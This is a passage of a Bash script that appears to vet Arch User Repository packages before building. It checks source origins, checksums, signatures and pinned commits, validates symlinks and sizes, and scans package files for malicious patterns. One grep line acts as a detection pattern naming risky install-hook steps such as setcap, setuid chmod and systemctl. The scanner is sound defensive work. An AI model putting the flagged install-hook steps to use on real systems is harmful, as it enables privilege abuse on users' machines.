    if /usr/bin/grep -Eq "$_AUR_GUARD_SOURCE_DOWNLOAD_RE" "$file" \
        && /usr/bin/grep -Eq "$_AUR_GUARD_SOURCE_EXEC_RE" "$file"; then
      _aur_guard_note_context_warning \
        "$pkg:source:$relative" \
        "$relative contains both network-download and execution-capable behavior, but no direct malicious download-to-execution chain matched"
    fi

    if [[ ${relative##*/} == 'package.json' ]] \
        && /usr/bin/grep -HnE "$_AUR_GUARD_PACKAGE_JSON_BLOCK_RE" "$file"; then
      matched=true
    fi
  done < <(find "${find_args[@]}")

  if $matched; then
    _aur_guard_fail "known malicious or unsafe execution pattern found in downloaded source code for $pkg"
    return 1
  fi

  printf 'AUR Verify: scanned %d script/build files for %s.\n' \
    "$scanned" "$pkg"
  if (( dependency_scanned > 0 )); then
    printf 'AUR Verify: %d scanned files were lockfile-resolved dependency-cache files.\n' \
      "$dependency_scanned"
  fi
  printf 'AUR Verify: %d opaque binary or non-text candidate files required integrity/artifact-only inspection.\n' \
    "$opaque_binary_files"
  printf 'AUR Verify: %d scanned files referenced network URLs; those URLs were not crawled.\n' \
    "$network_reference_files"
}

_aur_guard_tree_has_name() {
  local root="$1"
  shift

  [[ -d "$root" ]] || return 1

  local name
  for name in "$@"; do
    if find "$root" -type f -name "$name" -print -quit 2>/dev/null | grep -q .; then
      return 0
    fi
  done

  return 1
}

_aur_guard_pkgbuild_uses_tool() {
  local pkgdir="$1"
  local tool_re="$2"

  /usr/bin/grep -Eq \
    "(^|[^[:alnum:]_.+-])(${tool_re})([^[:alnum:]_.+-]|$)" \
    "$pkgdir/PKGBUILD"
}

_aur_guard_url_host() {
  local value="$1"
  local host

  value="${value#*::}"
  value="${value%%#*}"
  value="${value%%\?*}"

  case "$value" in
    git+*) value="${value#git+}" ;;
    hg+*) value="${value#hg+}" ;;
    svn+*) value="${value#svn+}" ;;
    bzr+*) value="${value#bzr+}" ;;
  esac

  case "$value" in
    *://*)
      host="${value#*://}"
      host="${host%%/*}"
      host="${host##*@}"
      host="${host%%:*}"
      ;;
    git@*:*|hg@*:*|svn@*:*)
      host="${value%%:*}"
      host="${host#*@}"
      ;;
    *)
      return 1
      ;;
  esac

  [[ "$host" =~ ^[A-Za-z0-9.-]+$ ]] || return 1
  printf '%s\n' "${host,,}"
}

_aur_guard_common_upstream_host() {
  local host="$1"

  case "$host" in
    github.com|codeload.github.com|raw.githubusercontent.com|objects.githubusercontent.com|\
    gitlab.com|codeberg.org|files.pythonhosted.org|pypi.org|\
    crates.io|static.crates.io|registry.npmjs.org|npmjs.com|\
    sourceforge.net|downloads.sourceforge.net|launchpad.net|\
    kernel.org|*.kernel.org|freedesktop.org|*.freedesktop.org|\
    gnu.org|*.gnu.org)
      return 0
      ;;
  esac

  return 1
}

_aur_guard_hosts_related() {
  local first="$1"
  local second="$2"

  [[ -n "$first" && -n "$second" ]] || return 1
  [[ "$first" == "$second" || "$first" == *".$second" || "$second" == *".$first" ]]
}

_aur_guard_forge_project_key() {
  local value="$1"
  local host path owner project

  value="${value#*::}"
  value="${value%%#*}"
  value="${value%%\?*}"

  case "$value" in
    git+*) value="${value#git+}" ;;
    hg+*) value="${value#hg+}" ;;
    svn+*) value="${value#svn+}" ;;
    bzr+*) value="${value#bzr+}" ;;
  esac

  host=$(_aur_guard_url_host "$value" 2>/dev/null || true)
  case "$host" in
    github.com|codeload.github.com|raw.githubusercontent.com|codeberg.org)
      ;;
    *)
      return 1
      ;;
  esac

  case "$value" in
    *://*)
      path="${value#*://}"
      path="${path#*/}"
      ;;
    git@*:*|hg@*:*|svn@*:*)
      path="${value#*:}"
      ;;
    *)
      return 1
      ;;
  esac

  owner="${path%%/*}"
  path="${path#*/}"
  project="${path%%/*}"
  project="${project%.git}"

  [[ -n "$owner" && -n "$project" ]] || return 1
  case "$host" in
    codeload.github.com|raw.githubusercontent.com)
      host='github.com'
      ;;
  esac

  printf '%s/%s/%s\n' "$host" "${owner,,}" "${project,,}"
}


_aur_guard_git_source_name() {
  local source_value="$1"
  local source_url clean name

  if [[ "$source_value" == *::* ]]; then
    name=${source_value%%::*}
  else
    source_url=${source_value#*::}
    clean=${source_url#git+}
    clean=${clean%%#*}
    clean=${clean%%\?*}
    clean=${clean%/}
    name=${clean##*/}
    name=${name%.git}
  fi

  [[ -n "$name" && "$name" != */* && "$name" != . && "$name" != .. ]] || return 1
  printf '%s\n' "$name"
}

_aur_guard_capture_git_snapshots() {
  local pkgbase="$1"
  local srcinfo="$2"
  local pkgdir="$3"
  local source_value source_url source_name repo relative commit remote
  local captured=0

  while IFS= read -r source_value; do
    [[ -n "$source_value" ]] || continue
    source_url=${source_value#*::}
    [[ "$source_url" == git+* ]] || continue

    source_name=$(_aur_guard_git_source_name "$source_value") || {
      _aur_guard_fail "$pkgbase has an invalid Git source name: $source_value"
      return 1
    }
    repo="$pkgdir/$source_name"
    [[ -e "$repo" ]] || {
      _aur_guard_fail "$pkgbase Git source was not fetched at the expected path: $source_name"
      return 1
    }

    commit=$(git -C "$repo" rev-parse --verify 'HEAD^{commit}' 2>/dev/null) || {
      _aur_guard_fail "$pkgbase could not resolve the fetched Git source commit: $source_name"
      return 1
    }
    remote=$(git -C "$repo" remote get-url origin 2>/dev/null) || {
      _aur_guard_fail "$pkgbase fetched Git source has no origin remote: $source_name"
      return 1
    }
    relative=${repo#"$pkgdir"/}

    printf '%s\t%s\t%s\t%s\n' "$pkgbase" "$relative" "$commit" "$remote" \
      >> "$_AUR_GUARD_VCS_SNAPSHOTS"
    printf 'AUR Verify: snapshot-pinned %s Git source %s at %s.\n' \
      "$pkgbase" "$source_name" "${commit:0:12}"
    ((captured++)) || true
  done < <(
    awk -F ' = ' '/^[[:space:]]*source(_[[:alnum:]_]+)? = / {print $2}' "$srcinfo"
  )

  return 0
}

_aur_guard_verify_git_snapshots() {
  local pkgbase="$1"
  local pkgdir="$2"
  local recorded_base relative expected_commit expected_remote repo current_commit current_remote

  [[ -f "$_AUR_GUARD_VCS_SNAPSHOTS" ]] || return 0

  while IFS=$'\t' read -r recorded_base relative expected_commit expected_remote; do
    [[ "$recorded_base" == "$pkgbase" ]] || continue
    repo="$pkgdir/$relative"

    current_commit=$(git -C "$repo" rev-parse --verify 'HEAD^{commit}' 2>/dev/null) || {
      _aur_guard_fail "$pkgbase Git source snapshot disappeared before the build: $relative"
      return 1
    }
    current_remote=$(git -C "$repo" remote get-url origin 2>/dev/null) || {
      _aur_guard_fail "$pkgbase Git source origin disappeared before the build: $relative"
      return 1
    }

    if [[ "$current_commit" != "$expected_commit" ]]; then
      _aur_guard_fail "$pkgbase Git source changed after verification: $relative"
      printf 'Expected commit: %s\nCurrent commit:  %s\n' \
        "$expected_commit" "$current_commit" >&2
      return 1
    fi
    if [[ "$current_remote" != "$expected_remote" ]]; then
      _aur_guard_fail "$pkgbase Git source origin changed after verification: $relative"
      return 1
    fi
  done < "$_AUR_GUARD_VCS_SNAPSHOTS"
}

_aur_guard_validate_source_origins() {
  local pkgbase="$1"
  local srcinfo="$2"
  local source_value source_url source_host source_project_key
  local project_url project_host project_key
  local -A seen_hosts=()

  project_url=$(
    awk -F ' = ' '/^[[:space:]]*url = / {print $2; exit}' "$srcinfo"
  )
  project_host=$(_aur_guard_url_host "$project_url" 2>/dev/null || true)
  project_key=$(_aur_guard_forge_project_key "$project_url" 2>/dev/null || true)

  if [[ -n "$project_url" ]]; then
    printf 'AUR Verify: %s project URL: %s\n' "$pkgbase" "$project_url"
  else
    _aur_guard_note_context_warning \
      "$pkgbase:project-url" \
      'the PKGBUILD does not declare an upstream project URL'
  fi

  while IFS= read -r source_value; do
    [[ -n "$source_value" ]] || continue
    source_url="${source_value#*::}"

    case "$source_url" in
      git+*)
        if [[ ! "$source_url" =~ \#commit=[0-9A-Fa-f]{40,64}([\&].*)?$ ]]; then
          printf 'AUR Verify: %s moving Git source will be snapshot-pinned before the clean build: %s\n' \
            "$pkgbase" "$source_value"
        fi
        ;;
      hg+*|svn+*|bzr+*)
        if [[ ! "$source_url" =~ \#commit=[0-9A-Fa-f]{40,64}([\&].*)?$ ]]; then
          _aur_guard_fail "$pkgbase has a non-Git VCS source that is not pinned to an exact commit hash: $source_value"
          return 1
        fi
        ;;
      http://*|ftp://*)
        _aur_guard_note_context_warning \
          "$pkgbase:source" \
          "unencrypted source transport is protected only by its declared checksum or signature: $source_value"
        ;;
    esac

    source_host=$(_aur_guard_url_host "$source_url" 2>/dev/null || true)
    [[ -n "$source_host" ]] || continue
    source_project_key=$(_aur_guard_forge_project_key "$source_url" 2>/dev/null || true)

    if [[ -z ${seen_hosts[$source_host]+set} ]]; then
      printf 'AUR Verify: %s source host: %s\n' "$pkgbase" "$source_host"
      seen_hosts[$source_host]=1
    fi

    if [[ -n "$project_key" && -n "$source_project_key" \
        && "$project_key" != "$source_project_key" ]]; then
      _aur_guard_note_context_warning \
        "$pkgbase:source-project:$source_project_key" \
        "source repository $source_project_key differs from the declared project repository $project_key; manually confirm it is the official release source"
      continue
    fi

    if _aur_guard_hosts_related "$source_host" "$project_host" \
        || _aur_guard_common_upstream_host "$source_host"; then
      continue
    fi

    _aur_guard_note_context_warning \
      "$pkgbase:source-host:$source_host" \
      "source host $source_host does not match the declared project host ${project_host:-unknown}; manually confirm it is an official release location"
  done < <(
    awk -F ' = ' '/^[[:space:]]*source(_[[:alnum:]_]+)? = / {print $2}' "$srcinfo"
  )
}

_aur_guard_validate_skipped_integrity() {
  local pkgbase="$1"
  local srcinfo="$2"

  if ! awk -F ' = ' '
    function trim(value) {
      gsub(/^[[:space:]]+|[[:space:]]+$/, "", value)
      return value
    }
    function source_suffix(key, suffix) {
      suffix = trim(key)
      sub(/^source/, "", suffix)
      return suffix
    }
    function checksum_suffix(key, suffix) {
      suffix = trim(key)
      sub(/^(b2|sha(224|256|384|512)|md5)sums/, "", suffix)
      return suffix
    }
    function strip_alias(value) {
      sub(/^.*::/, "", value)
      return value
    }
    function local_name(value, clean, count, parts) {
      clean = value
      if (clean ~ /::/) {
        sub(/::.*/, "", clean)
        return clean
      }
      clean = strip_alias(clean)
      sub(/[?#].*$/, "", clean)
      count = split(clean, parts, "/")
      return parts[count]
    }
    function is_remote(value, clean) {
      clean = strip_alias(value)
      return clean ~ /^([[:alpha:]][[:alnum:]+.-]*:|git\+|hg\+|svn\+|bzr\+)/
    }
    function exact_vcs(value, clean) {
      clean = strip_alias(value)
      return clean ~ /^(git|hg|svn|bzr)\+/ \
        && clean ~ /#commit=[0-9A-Fa-f]{40,64}([&].*)?$/
    }
    function content_addressed_pypi(value, clean, count, parts, digest) {
      clean = strip_alias(value)
      sub(/[?#].*$/, "", clean)
      if (clean !~ /^https:\/\/files\.pythonhosted\.org\/packages\/[0-9A-Fa-f][0-9A-Fa-f]\/[0-9A-Fa-f][0-9A-Fa-f]\//) {
        return 0
      }
      count = split(clean, parts, "/")
      digest = parts[count - 3] parts[count - 2] parts[count - 1]
      return length(parts[count - 3]) == 2 \
        && length(parts[count - 2]) == 2 \
        && length(parts[count - 1]) == 60 \
        && length(digest) == 64 \
        && digest !~ /[^0-9A-Fa-f]/
    }
    function github_release_asset(value, clean) {
      clean = strip_alias(value)
      sub(/[?#].*$/, "", clean)
      return clean ~ /^https:\/\/github\.com\/[^\/]+\/[^\/]+\/releases\/download\/[^\/]+\/[^\/]+$/
    }
    function is_signature(name) {
      return name ~ /\.(sig|sign|asc)$/
    }
    function signed_name(name) {
      sub(/\.(sig|sign|asc)$/, "", name)
      return name
    }
    /^[[:space:]]*validpgpkeys = / {
      fingerprint = trim($2)
      if (fingerprint !~ /^[0-9A-Fa-f]{40}$/           && fingerprint !~ /^[0-9A-Fa-f]{64}$/) {
        printf "Invalid validpgpkeys fingerprint: %s\n", fingerprint > "/dev/stderr"
        bad = 1
      }
      valid_pgp = 1
      next
    }
    /^[[:space:]]*source(_[[:alnum:]_]+)? = / {
      suffix = source_suffix($1)
      i = ++source_count[suffix]
      source[suffix SUBSEP i] = $2
      next
    }
    /^[[:space:]]*(b2|sha256|sha384|sha512)sums(_[[:alnum:]_]+)? = / {
      suffix = checksum_suffix($1)
      i = ++checksum_count[$1]
      if ($2 != "SKIP") strong[suffix SUBSEP i] = 1
      next
    }
    END {
      for (suffix in source_count) {
        for (i = 1; i <= source_count[suffix]; i++) {
          key = suffix SUBSEP i
          name = local_name(source[key])
          source_name[suffix SUBSEP name] = 1
          if (strong[key]) strong_name[suffix SUBSEP name] = 1
          if (is_signature(name)) {
            signature_for[suffix SUBSEP signed_name(name)] = 1
          }
        }
      }

      for (suffix in source_count) {
        for (i = 1; i <= source_count[suffix]; i++) {
          key = suffix SUBSEP i
          value = source[key]
          name = local_name(value)

          # Moving Git sources are fetched once, recorded by exact commit, and
          # then held with makepkg --holdver through preparation and build.
          if (!is_remote(value) || exact_vcs(value) \
              || strip_alias(value) ~ /^git\+/ \
              || strong[key] || content_addressed_pypi(value) \
              || github_release_asset(value)) continue

          # Detached signature sidecars do not need their own checksum. They
          # cannot authenticate another source unless that payload independently
          # matches the sidecar naming rule and validpgpkeys is pinned.
          if (valid_pgp && is_signature(name)) continue

          if (valid_pgp && signature_for[suffix SUBSEP name]) continue

          printf "Source lacks a strong checksum, exact VCS commit, or matching pinned PGP signature: %s\n", \
            value > "/dev/stderr"
          bad = 1
        }
      }
      exit bad
    }
  ' "$srcinfo"; then
    _aur_guard_fail "$pkgbase contains a remote source without strong immutable integrity verification"
    return 1
  fi
}

_aur_guard_verify_content_addressed_sources() {
  local pkgbase="$1"
  local srcinfo="$2"
  local pkgdir="$3"
  local source_value source_url clean_url digest local_name source_file actual
  local arch
  local verified=0

  arch=$(uname -m) || return 1

  while IFS= read -r source_value; do
    [[ -n "$source_value" ]] || continue
    source_url=${source_value#*::}
    clean_url=${source_url%%\#*}
    clean_url=${clean_url%%\?*}

    if [[ ! "$clean_url" =~ ^https://files\.pythonhosted\.org/packages/([0-9A-Fa-f]{2})/([0-9A-Fa-f]{2})/([0-9A-Fa-f]{60})/([^/]+)$ ]]; then
      continue
    fi

    digest=${BASH_REMATCH[1]}${BASH_REMATCH[2]}${BASH_REMATCH[3]}
    digest=${digest,,}
    if [[ "$source_value" == *::* ]]; then
      local_name=${source_value%%::*}
    else
      local_name=${clean_url##*/}
    fi

    case "$local_name" in
      ''|.|..|*/*)
        _aur_guard_fail "$pkgbase has an unsafe local name for a content-addressed PyPI source: $local_name"
        return 1
        ;;
    esac

    source_file="$pkgdir/$local_name"
    if [[ ! -f "$source_file" || -L "$source_file" ]]; then
      _aur_guard_fail "$pkgbase content-addressed PyPI source is missing or not a regular file: $local_name"
      return 1
    fi

    actual=$(/usr/bin/b2sum -l 256 -- "$source_file" 2>/dev/null) || {
      _aur_guard_fail "could not calculate BLAKE2b-256 for $pkgbase source: $local_name"
      return 1
    }
    actual=${actual%% *}
    actual=${actual,,}

    if [[ "$actual" != "$digest" ]]; then
      _aur_guard_fail "$pkgbase content-addressed PyPI source digest does not match its URL: $local_name"
      return 1
    fi

    ((verified += 1))
  done < <(
    awk -F ' = ' -v arch="$arch" '
      {
        key = $1
        gsub(/^[[:space:]]+|[[:space:]]+$/, "", key)
        if (key == "source" || key == "source_" arch) print $2
      }
    ' "$srcinfo"
  )

  if (( verified > 0 )); then
    printf 'AUR Verify: verified %d content-addressed PyPI source file(s) with BLAKE2b-256.\n' \
      "$verified"
  fi
}

_aur_guard_verify_github_release_asset_digests() {
  local pkgbase="$1"
  local srcinfo="$2"
  local pkgdir="$3"
  local source_value source_url clean_url local_name source_file actual
  local owner repo tag asset tag_api api_url api_json api_key digest digest_value
  local arch
  local verified=0

  arch=$(uname -m) || return 1

  while IFS= read -r source_value; do
    [[ -n "$source_value" ]] || continue
    source_url=${source_value#*::}
    clean_url=${source_url%%\#*}
    clean_url=${clean_url%%\?*}

    if [[ ! "$clean_url" =~ ^https://github\.com/([^/]+)/([^/]+)/releases/download/([^/]+)/([^/]+)$ ]]; then
      continue
    fi

    owner=${BASH_REMATCH[1]}
    repo=${BASH_REMATCH[2]}
    tag=${BASH_REMATCH[3]}
    asset=${BASH_REMATCH[4]}

    case "$owner/$repo/$tag/$asset" in
      *$'\n'*|*$'\r'*|*'..'*|*'//'*)
        _aur_guard_fail "$pkgbase has an unsafe GitHub release asset URL: $clean_url"
        return 1
        ;;
    esac

    if [[ "$source_value" == *::* ]]; then
      local_name=${source_value%%::*}
    else
      local_name=${clean_url##*/}
    fi

    case "$local_name" in
      ''|.|..|*/*)
        _aur_guard_fail "$pkgbase has an unsafe local name for a GitHub release asset: $local_name"
        return 1
        ;;
    esac

    source_file="$pkgdir/$local_name"
    if [[ ! -f "$source_file" || -L "$source_file" ]]; then
      _aur_guard_fail "$pkgbase GitHub release asset is missing or not a regular file: $local_name"
      return 1
    fi

    tag_api=$(_aur_guard_urlencode "$tag") || return 1
    api_url="https://api.github.com/repos/${owner}/${repo}/releases/tags/${tag_api}"

    mkdir -p "$pkgdir/.awtarchy-github-digests" || return 1
    api_key=$(printf '%s\n' "$owner/$repo/$tag" | sha256sum | awk '{print $1}') || return 1
    api_json="$pkgdir/.awtarchy-github-digests/${api_key}.json"

    if [[ ! -s "$api_json" ]]; then
      if ! _aur_guard_download "$api_url" "$api_json" || [[ ! -s "$api_json" ]]; then
        _aur_guard_fail "$pkgbase could not retrieve GitHub release asset digest metadata for $clean_url"
        return 1
      fi
    fi

    digest=$(
      jq -er --arg url "$clean_url" --arg name "$asset" '
        .assets[]?
        | select(.browser_download_url == $url or .name == $name)
        | .digest
      ' "$api_json" 2>/dev/null | head -n 1
    ) || digest=''

    if [[ ! "$digest" =~ ^sha256:[0-9A-Fa-f]{64}$ ]]; then
      _aur_guard_fail "$pkgbase GitHub release asset has no usable SHA256 digest in GitHub metadata: $clean_url"
      return 1
    fi

    digest_value=${digest#sha256:}
    digest_value=${digest_value,,}
    actual=$(sha256sum -- "$source_file" | awk '{print $1}') || {
      _aur_guard_fail "could not calculate SHA256 for $pkgbase GitHub release asset: $local_name"
      return 1
    }
    actual=${actual,,}

    if [[ "$actual" != "$digest_value" ]]; then
      _aur_guard_fail "$pkgbase GitHub release asset SHA256 does not match GitHub metadata: $local_name"
      printf 'Expected: %s\nActual:   %s\n' "$digest_value" "$actual" >&2
      return 1
    fi

    ((verified += 1))
  done < <(
    awk -F ' = ' -v arch="$arch" '
      {
        key = $1
        gsub(/^[[:space:]]+|[[:space:]]+$/, "", key)
        if (key == "source" || key == "source_" arch) print $2
      }
    ' "$srcinfo"
  )

  if (( verified > 0 )); then
    printf 'AUR Verify: verified %d GitHub release asset source file(s) with GitHub SHA256 digest metadata.\n' \
      "$verified"
  fi
}

_aur_guard_validate_dependency_evidence() {
  local pkgbase="$1"
  local srcinfo="$2"
  local pkgdir="$3"
  local source_root="$4"
  local dep_spec dep_name
  local package_json=false
  local js_source=false
  local js_lock=false
  local manager

  if _aur_guard_tree_has_name "$source_root" package.json; then
    package_json=true
  fi

  if find "$source_root" -type f \
      \( -name '*.js' -o -name '*.jsx' -o -name '*.mjs' -o -name '*.cjs' \
         -o -name '*.ts' -o -name '*.tsx' \) \
      -print -quit 2>/dev/null | grep -q .; then
    js_source=true
  fi

  if _aur_guard_tree_has_name "$source_root" \
      package-lock.json npm-shrinkwrap.json pnpm-lock.yaml yarn.lock bun.lock bun.lockb; then
    js_lock=true
  fi

  while IFS= read -r dep_spec; do
    [[ -n "$dep_spec" ]] || continue
    dep_name=$(_aur_guard_dependency_name "$dep_spec")
    [[ -n "$dep_name" ]] || continue

    manager=''
    case "$dep_name" in
      bun|bun-bin|bun-git) manager='bun' ;;
      npm) manager='npm' ;;
      pnpm|pnpm-bin) manager='pnpm' ;;
      yarn|yarn-berry) manager='yarn' ;;
    esac

    if [[ -n "$manager" ]]; then
      if ! $package_json; then
        _aur_guard_fail "$pkgbase declares $dep_name but its verified source has no package.json"
        return 1
      fi

      if ! _aur_guard_pkgbuild_uses_tool "$pkgdir" "$manager"; then
        _aur_guard_note_context_warning \
          "$pkgbase:$dep_name" \
          "$dep_name is declared and package.json exists, but the PKGBUILD does not directly invoke $manager"
      fi

      if ! $js_lock; then
        _aur_guard_note_context_warning \
          "$pkgbase:$dep_name" \
          "$dep_name is declared and package.json exists, but no recognized JavaScript lockfile was found"
      else
        printf 'AUR Verify: %s dependency %s matches JavaScript project manifests.\n' \
          "$pkgbase" "$dep_name"
      fi
    fi

    case "$dep_name" in
      nodejs|nodejs-lts-*)
        if ! $package_json && ! $js_source \
            && ! _aur_guard_pkgbuild_uses_tool "$pkgdir" 'node|nodejs'; then
          _aur_guard_note_context_warning \
            "$pkgbase:$dep_name" \
            "$dep_name is declared but no package.json, JavaScript/TypeScript source, or direct Node.js build usage was found"
        fi
        ;;
      cargo|rust|rustup)
        if ! _aur_guard_tree_has_name "$source_root" Cargo.toml; then
          _aur_guard_note_context_warning \
            "$pkgbase:$dep_name" \
            "$dep_name is declared but no Cargo.toml was found in the verified source"
        fi
        ;;
      go)
        if ! _aur_guard_tree_has_name "$source_root" go.mod; then
          _aur_guard_note_context_warning \
            "$pkgbase:$dep_name" \
            "Go is declared but no go.mod was found in the verified source"
        fi
        ;;
      cmake)
        if ! _aur_guard_tree_has_name "$source_root" CMakeLists.txt; then
          _aur_guard_note_context_warning \
            "$pkgbase:$dep_name" \
            "CMake is declared but no CMakeLists.txt was found in the verified source"
        fi
        ;;
      meson)
        if ! _aur_guard_tree_has_name "$source_root" meson.build; then
          _aur_guard_note_context_warning \
            "$pkgbase:$dep_name" \
            "Meson is declared but no meson.build was found in the verified source"
        fi
        ;;
    esac
  done < <(
    awk -F ' = ' '
      /^[[:space:]]*(depends|makedepends|checkdepends)(_[[:alnum:]_]+)? = / {
        print $2
      }
    ' "$srcinfo" | LC_ALL=C sort -u
  )
}

_aur_guard_record_required_package() {
  local pkgbase="$1"
  local pkgname="$2"
  local line

  line="$pkgbase"$'\t'"$pkgname"
  grep -Fqx -- "$line" "$_AUR_GUARD_REQUIRED_PACKAGES" 2>/dev/null \
    || printf '%s\n' "$line" >> "$_AUR_GUARD_REQUIRED_PACKAGES"
}

_aur_guard_record_repo_dependency() {
  local pkg="$1"
  [[ -n "$pkg" ]] || return 0
  _aur_guard_validate_package_name "$pkg" || return 1
  grep -Fqx -- "$pkg" "$_AUR_GUARD_REPO_DEPS" 2>/dev/null \
    || printf '%s\n' "$pkg" >> "$_AUR_GUARD_REPO_DEPS"
}

_aur_guard_scan_package_files() {
  local pkg="$1"
  local pkgdir="$2"
  local matched=false
  local package_file relative hard_block_matches

  printf 'AUR Verify: scanning %s for known malicious patterns.\n' "$pkg"

  hard_block_matches=$(grep -rInE \
      --exclude-dir='.git' \
      --exclude='PKGBUILD' \
      --binary-files=without-match \
      "$_AUR_GUARD_HARD_BLOCK_RE" \
      "$pkgdir" || true)
  if [[ -n "$hard_block_matches" ]]; then
    printf '%s\n' "$hard_block_matches"
    matched=true
  fi

  while IFS= read -r -d '' package_file; do
    relative="${package_file#"$pkgdir"/}"
    hard_block_matches=$(_aur_guard_file_hard_block_matches \
      "$package_file" "$_AUR_GUARD_HARD_BLOCK_RE" "$relative" || true)
    if [[ -n "$hard_block_matches" ]]; then
      printf '%s\n' "$hard_block_matches"
      matched=true
    fi
  done < <(find "$pkgdir" -type f -name PKGBUILD ! -path '*/.git/*' -print0)

  local hook_matches package_json_matches

  hook_matches=$(find "$pkgdir" -type f -name '*.install' \
    -exec /usr/bin/grep -HnE "$_AUR_GUARD_HOOK_BLOCK_RE" {} + 2>/dev/null) || true
  if [[ -n "$hook_matches" ]]; then
    printf '%s\n' "$hook_matches"
    matched=true
  fi

  package_json_matches=$(find "$pkgdir" -type f -name 'package.json' \
    -exec /usr/bin/grep -HnE "$_AUR_GUARD_PACKAGE_JSON_BLOCK_RE" {} + 2>/dev/null) || true
  if [[ -n "$package_json_matches" ]]; then
    printf '%s\n' "$package_json_matches"
    matched=true
  fi

  if $matched; then
    _aur_guard_fail "known malicious or unsafe execution pattern found in $pkg"
    return 1
  fi

  grep -rInE \
    --exclude-dir='.git' \
    --include='PKGBUILD' \
    --include='*.install' \
    '^[[:space:]]*install=|post_install|post_upgrade|pre_install|pre_upgrade|setcap|chmod[[:space:]].*[+u]s|systemctl' \
    "$pkgdir" || true

  _aur_guard_scan_source_tree "$pkg" "$pkgdir" recursive
}

_aur_guard_scan_checkout_with_aur_scan() {
  local pkg="$1"
  local pkgdir="$2"
  local scanner status

  if [[ ${_AUR_GUARD_AUR_SCAN_BOOTSTRAP:-0} == 1 ]]; then
    printf 'AUR Verify: aur-scan bootstrap is in progress; built-in AUR Guard checks remain active for %s.\n' \
      "$pkg"
    return 0
  fi

  scanner=$(type -P aur-scan 2>/dev/null) || {
    _aur_guard_fail "aur-scan is required before evaluating $pkg. Install $_AUR_GUARD_AUR_SCAN_PACKAGE with: aurinstall $_AUR_GUARD_AUR_SCAN_PACKAGE"
    return 127
  }

  printf 'AUR Verify: running aur-scan on the exact fetched checkout for %s.\n' "$pkg"
  if "$scanner" scan "$pkgdir" --fail-on high; then
    return 0
  else
    status=$?
  fi

  _aur_guard_fail "aur-scan rejected or could not scan the exact fetched checkout for $pkg"
  return "$status"
}

_aur_guard_normalize_srcinfo() {
  local file="$1"

  # makepkg may discard trailing spaces and trailing blank lines when writing
  # .SRCINFO. Preserve all actual metadata and internal blank lines while
  # removing only those insignificant end-of-line/end-of-file differences.
  LC_ALL=C awk '
    {
      sub(/[[:space:]]+$/, "")
      lines[NR] = $0
      if ($0 !~ /^[[:space:]]*$/) last = NR
    }
    END {
      for (i = 1; i <= last; i++) print lines[i]
    }
  ' "$file"
}

_aur_guard_verify_srcinfo() {
  local pkg="$1"
  local pkgdir="$2"
  local generated="$pkgdir/.SRCINFO.awtarchy"
  local committed_normalized="$pkgdir/.SRCINFO.committed-normalized"
  local generated_normalized="$pkgdir/.SRCINFO.generated-normalized"

  [[ -f "$pkgdir/.SRCINFO" ]] || {
    _aur_guard_fail "$pkg has no committed .SRCINFO"
    return 1
  }

  if ! _aur_guard_makepkg_sandbox "$pkgdir" deny readonly \
      --printsrcinfo > "$generated"; then
    rm -f "$generated"
    _aur_guard_fail "could not regenerate .SRCINFO for $pkg inside the sandbox"
    return 1
  fi

  _aur_guard_assert_tracked_files_unchanged "$pkg" "$pkgdir" || {
    rm -f "$generated"
    return 1
  }

  _aur_guard_normalize_srcinfo "$pkgdir/.SRCINFO" > "$committed_normalized"
  _aur_guard_normalize_srcinfo "$generated" > "$generated_normalized"

  if ! diff -u "$committed_normalized" "$generated_normalized"; then
    diff -u "$pkgdir/.SRCINFO" "$generated" >&2 || true
    rm -f "$generated" "$committed_normalized" "$generated_normalized"
    _aur_guard_fail "$pkg has a PKGBUILD/.SRCINFO mismatch"
    return 1
  fi

  if ! cmp -s "$pkgdir/.SRCINFO" "$generated"; then
    printf 'AUR Verify: %s committed .SRCINFO differs only by insignificant trailing whitespace or trailing blank lines.\n' \
      "$pkg"
  fi

  rm -f "$committed_normalized" "$generated_normalized"
  mv -f "$generated" "$pkgdir/.SRCINFO.verified"
}

_aur_guard_validate_checkout_tree() {
  local pkgbase="$1"
  local pkgdir="$2"
  local entry count tree_bytes

  [[ -f "$pkgdir/PKGBUILD" && ! -L "$pkgdir/PKGBUILD" ]] || {
    _aur_guard_fail "$pkgbase does not contain a regular PKGBUILD"
    return 1
  }
  [[ -f "$pkgdir/.SRCINFO" && ! -L "$pkgdir/.SRCINFO" ]] || {
    _aur_guard_fail "$pkgbase does not contain a regular committed .SRCINFO"
    return 1
  }

  entry=$(find -P "$pkgdir" -path "$pkgdir/.git" -prune -o \
    ! -type d ! -type f ! -type l -print -quit 2>/dev/null)
  if [[ -n "$entry" ]]; then
    _aur_guard_fail "$pkgbase contains a special file in its AUR checkout: ${entry#"$pkgdir"/}"
    return 1
  fi

  local target resolved
  while IFS= read -r -d '' entry; do
    target=$(readlink -- "$entry") || return 1
    case "$target" in
      /*)
        _aur_guard_fail "$pkgbase contains an absolute symbolic link in its AUR checkout: ${entry#"$pkgdir"/} -> $target"
        return 1
        ;;
    esac

    resolved=$(/usr/bin/realpath -e -- "$entry" 2>/dev/null) || {
      _aur_guard_fail "$pkgbase contains a dangling or cyclic symbolic link in its AUR checkout: ${entry#"$pkgdir"/} -> $target"
      return 1
    }
    case "$resolved" in
      "$pkgdir/.git"|"$pkgdir/.git"/*)
        _aur_guard_fail "$pkgbase contains a symbolic link into AUR Git metadata: ${entry#"$pkgdir"/} -> $target"
        return 1
        ;;
      "$pkgdir"|"$pkgdir"/*)
        ;;
      *)
        _aur_guard_fail "$pkgbase contains a symbolic link escaping its AUR checkout: ${entry#"$pkgdir"/} -> $target"
        return 1
        ;;
    esac
  done < <(find -P "$pkgdir" -path "$pkgdir/.git" -prune -o -type l -print0)

  count=$(find -P "$pkgdir" -path "$pkgdir/.git" -prune -o \
    \( -type f -o -type l \) -print | wc -l) || return 1
  if (( count > _AUR_GUARD_SOURCE_SCAN_MAX_FILES )); then
    _aur_guard_fail "$pkgbase AUR checkout contains too many files"
    return 1
  fi

  tree_bytes=$(du -sb --apparent-size --exclude=.git "$pkgdir" 2>/dev/null \
    | awk '{print $1}') || return 1
  if (( tree_bytes > _AUR_GUARD_TREE_MAX_BYTES )); then
    _aur_guard_fail "$pkgbase AUR checkout exceeds the size limit"
    return 1
  fi
}

_aur_guard_fetch_package() {
  local pkg="$1"
  local fetch_parent="$2"
  local pkgbase maintainer last_modified metadata remote pkgdir

  _aur_guard_validate_package_name "$pkg" || return 1
  metadata=$(_aur_guard_rpc_package_metadata "$pkg") || return 1
  IFS=$'\t' read -r pkgbase maintainer last_modified <<< "$metadata"

